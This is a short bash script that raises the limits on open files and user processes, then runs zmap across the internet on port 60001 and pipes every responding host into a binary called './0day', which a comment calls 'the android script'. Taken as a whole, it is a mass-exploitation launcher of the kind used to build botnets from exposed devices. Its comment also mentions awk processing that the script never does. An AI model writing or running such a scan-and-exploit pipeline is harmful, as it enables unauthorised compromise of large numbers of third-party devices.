!/bin/bash

# Increase the limit for open files and user processes
ulimit -n 999999
ulimit -u 999999

# Run zmap and process output with awk, then pipe to the android script
ulimit -n 999999; zmap -p 60001 | ./0day